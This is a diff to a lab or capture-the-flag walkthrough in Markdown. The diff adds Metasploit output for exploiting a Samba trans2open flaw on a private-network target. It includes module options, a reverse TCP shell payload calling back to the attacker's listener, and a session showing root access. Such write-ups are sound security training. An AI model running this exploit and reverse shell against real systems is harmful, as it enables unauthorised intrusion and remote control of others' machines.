@@ -88,9 +88,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
 
 This shows number of services running on the target including ssh, http, smb, etc.
 
-As per the results obtained, these are the most exploitable services we can use to enter into a system. Now, let's look for a way to enter into the target. 
-
-First I go to the web page as http service is running but we get nothing much and it gives us a default test page.
+First I go to the web page as `http service` is running but we get nothing much and it gives us a default test page.
 
 ![2](https://github.com/user-attachments/assets/1faaf1d5-03f5-449a-8fa4-36130266066d)
 
@@ -286,12 +284,66 @@ msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
 payload => linux/x86/shell_reverse_tcp
 
 ```
+Now use `show options` command to check that everything is set properly.
 
-Then simply run the exploit and voilla!, I get the root shell.
+```console
+msf6 exploit(linux/samba/trans2open) > show options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.78.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
 
 
-root shell
-That’s it for this challenge we have to gain the root access. This can be done in numerous ways, this is one of them.
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.78.129   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Then simply run the exploit and voilà!, I get the root shell.
+
+```console
+msf6 exploit(linux/samba/trans2open) > exploit
+
+[*] Started reverse TCP handler on 192.168.78.129:4444 
+[*] 192.168.78.131:139 - Trying return address 0xbffffdfc...
+[*] 192.168.78.131:139 - Trying return address 0xbffffcfc...
+[*] 192.168.78.131:139 - Trying return address 0xbffffbfc...
+[*] 192.168.78.131:139 - Trying return address 0xbffffafc...
+[*] 192.168.78.131:139 - Trying return address 0xbffff9fc...
+[*] 192.168.78.131:139 - Trying return address 0xbffff8fc...
+[*] 192.168.78.131:139 - Trying return address 0xbffff7fc...
+[*] 192.168.78.131:139 - Trying return address 0xbffff6fc...
+[*] Command shell session 1 opened (192.168.78.129:4444 -> 192.168.78.131:32777) at 2024-07-29 12:50:46 -0400
+
+[*] Command shell session 2 opened (192.168.78.129:4444 -> 192.168.78.131:32778) at 2024-07-29 12:50:47 -0400
+[*] Command shell session 3 opened (192.168.78.129:4444 -> 192.168.78.131:32779) at 2024-07-29 12:50:48 -0400
+[*] Command shell session 4 opened (192.168.78.129:4444 -> 192.168.78.131:32780) at 2024-07-29 12:50:50 -0400
+id
+uid=0(root) gid=0(root) groups=99(nobody)
+whoami
+root
+
+```
+
+That’s it for this machine we have to gain the root access. This can be done in numerous ways, this is one of them.
 
 ---
 ## Happy Hacking ;)
